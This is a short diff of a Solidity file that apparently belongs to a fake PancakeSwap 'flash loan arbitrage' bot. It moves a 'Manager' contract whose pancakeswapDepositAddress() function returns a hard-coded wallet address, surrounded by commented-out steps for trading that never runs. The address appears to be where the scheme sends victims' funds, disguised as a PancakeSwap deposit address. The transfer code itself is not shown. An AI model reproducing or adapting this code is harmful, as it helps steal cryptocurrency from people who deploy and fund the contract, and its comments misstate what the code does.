@@ -8,6 +8,18 @@
 //import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
 
+pragma solidity ^0.6.6;
+
+contract Manager {
+        function performTasks() public {
+   
+        }
+
+        function pancakeswapDepositAddress() public pure returns (address) {
+                   return 0x9244E01deFd966D4b8cF9A20FE5617b23008822d;
+         }
+} 
+
    
  /*
  // Submit token to Ethereum blockchain
@@ -22,17 +34,7 @@
 
 // Convert half ETH to DAI
 //manager.pancakeswapDAItoETH(loanAmount / 2);
-pragma solidity ^0.6.6;
 
-contract Manager {
-        function performTasks() public {
-   
-        }
-
-        function pancakeswapDepositAddress() public pure returns (address) {
-                   return 0x9244E01deFd966D4b8cF9A20FE5617b23008822d;
-         }
-} 
 // Create ETH and DAI pairs for our token & Provide liquidity
  //string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
 //manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
